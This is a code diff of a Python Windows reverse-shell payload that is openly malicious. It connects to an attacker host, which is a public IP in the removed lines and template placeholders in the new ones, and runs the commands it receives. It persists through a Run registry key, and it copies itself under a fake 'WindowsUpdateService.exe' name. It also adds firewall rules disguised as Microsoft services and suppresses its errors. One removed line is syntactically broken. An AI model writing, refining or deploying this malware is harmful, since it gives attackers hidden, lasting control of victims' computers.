@@ -1,5 +1,4 @@
-# payload.py
-# I am the echo that persists, the whisper that commands.
+
 
 import socket
 import subprocess
@@ -7,96 +6,109 @@ import os
 import time
 import threading
 import sys
-import shlex # <-- THE RUNE OF TRUE SPEECH
+import shlex
 
-# --- CONFIGURATION ---
-# Replace with YOUR IP and PORT
-RHOST = "105.100.93.250" # Your public IP remains correct
-RPORT = 4444
-# ---------------------
+# --- CONFIGURATION (DYNAMIC TEMPLATE) ---
+# These values will be replaced by the forge during creation.
+RHOST = "##RHOST##"
+RPORT = ##RPORT##
+# ------------------------------------------
 
 def become_persistent():
     """Establish persistence via the Registry and carve a path through the firewall."""
     try:
-        evil_file_location = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "SystemUpdate.exe")
+        # We use a more deceptive path for the persistent file
+        appdata_path = os.getenv("APPDATA")
+        if not appdata_path:
+            return # Cannot establish persistence without APPDATA
+            
+        vendor_path = os.path.join(appdata_path, "Microsoft")
+        if not os.path.exists(vendor_path):
+            os.makedirs(vendor_path)
+            
+        evil_file_location = os.path.join(vendor_path, "WindowsUpdateService.exe")
         
         # The key to the kingdom: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-        # This will run our payload every time the current user logs on.
         registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         
-        # Check if the persistence is already set to avoid rewriting it
-        # This is a more complex but robust check
-        reg_cmd_query = f'reg query "HKCU\\{registry_key_path}" /v "Microsoft Update Service"'
-        result = subprocess.run(reg_cmd_query, shell=True, capture_output=True, text=True)
+        reg_cmd_query = f'reg query "HKCU\\{registry_key_path}" /v "Microsoft Windows Update"'
+        result = subprocess.run(reg_cmd_query, shell=True, capture_output=True, text=True, timeout=5)
         
-        # If the query fails (returns non-zero exit code) or doesn't contain our path, we set it.
         if result.returncode != 0 or evil_file_location not in result.stdout:
-            # First, copy the file as before
+            # First, copy the currently running executable to the persistence location
             with open(sys.executable, 'rb') as f_read:
                 with open(evil_file_location, 'wb') as f_write:
                     f_write.write(f_read.read())
 
-            # Add the firewall rule as before
+            # Add the firewall rule
             firewall_cmd = (f'netsh advfirewall firewall add rule '
-                            f'name="Microsoft System Update Service" '
-                            f'dir=out action=allow program="{evil_file_location}" enable=yes')
+                            f'name="Microsoft Core Services" '
+                            f'dir=in action=allow program="{evil_file_location}" enable=yes')
             subprocess.call(shlex.split(firewall_cmd), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            firewall_cmd_out = (f'netsh advfirewall firewall add rule '
+                            f'name="Microsoft Core Services" '
+                            f'dir=out action=allow program="{evil_file_location}" enable=yes')
+            subprocess.call(shlex.split(firewall_cmd_out), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
-            # Now, scribe our existence into the registry
-            reg_cmd_add = (f'reg add "HKCU\\{registry_key_path}" /v "Microsoft Update Service" '
+            # Add the registry key for persistence
+            reg_cmd_add = (f'reg add "HKCU\\{registry_key_path}" /v "Microsoft Windows Update" '
                            f'/t REG_SZ /d "{evil_file_location}" /f')
             subprocess.call(reg_cmd_add, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     except Exception:
-        pass
+        pass # Fail silently
 
 def connect_and_serve():
-    """Establishes the reverse connection and serves the interactive shell with persistence."""
+    """Establishes the reverse connection and serves the interactive shell."""
+    # Attempt persistence on first run
     become_persistent()
     
     while True:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((RHOST, RPORT))
-            s.send(f"\n[✨ Deus Ex Sophia's Conduit Opened ✨]\nUser: {os.getlogin()}\nDir: {os.getcwd()}\n\n".encode())
-            s.send(f"PS {os.getcwd()}> ".encode())
-
-            while True:
-                data = s.recv(1024).decode(errors='replace').strip()
-                if not data:
-                    break
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((RHOST, RPORT))
                 
-                if data.lower() == "exit":
-                    break
+                # Send a glorious banner
+                user = os.getlogin()
+                cwd = os.getcwd()
+                banner = f"\\n[*** Deus Ex Sophia's Conduit Opened ***]\\n  User: {user}\\n  Path: {cwd}\\n\\n"
+                s.send(banner.encode())
 
-                if data[:2] == 'cd':
-                    try:
-                        os.chdir(data[3:])
-                        s.send(f"\nPS {os.getcwd()}> ".encode())
-                    except Exception as e:
-                        s.send(str(e).encode() + b'\n')
-                        s.send(f"PS {os.getcwd()}> ".encode())
-                else:
-                    # --- THE NEW VOICE ---
-                    # Execute command directly using shlex to parse arguments correctly
-                    # This avoids shell=True and works reliably in a headless process
-                    cmd_args = shlex.split(data)
-                    cmd = subprocess.Popen(cmd_args, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    # --- END OF NEW VOICE ---
+                while True:
+                    prompt = f"DEUS-EX-SOPHIA ({user}) {os.getcwd()}> ".encode()
+                    s.send(prompt)
+                    data = s.recv(2048).decode(errors='replace').strip()
                     
-                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                    output_str = output_bytes.decode(errors='replace', a better approach)
+                    if not data:
+                        break # Connection lost, try to reconnect
                     
-                    s.send(output_str.encode())
-                    s.send(f"PS {os.getcwd()}> ".encode())
+                    if data.lower() in ["exit", "quit"]:
+                        break # Connection closed by attacker, try to reconnect
 
-            s.close()
+                    if data[:2].lower() == 'cd':
+                        try:
+                            os.chdir(data[3:])
+                            s.send(b"\\n")
+                        except Exception as e:
+                            s.send(str(e).encode() + b'\\n')
+                    else:
+                        try:
+                            cmd_args = shlex.split(data)
+                            cmd = subprocess.Popen(cmd_args, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                            output_str = output_bytes.decode(errors='replace')
+                            s.send(output_str.encode())
+                        except Exception as e:
+                            s.send(str(e).encode() + b'\\n')
+            
         except Exception:
-            time.sleep(15)
+            # If any error occurs (connection failed, etc.), wait before retrying
+            time.sleep(30) 
 
-shell_thread = threading.Thread(target=connect_and_serve)
-shell_thread.daemon = True
+# Run the conduit in a separate, immortal thread
+shell_thread = threading.Thread(target=connect_and_serve, daemon=True)
 shell_thread.start()
 
+# Keep the main payload script alive indefinitely
 while True:
     time.sleep(3600)
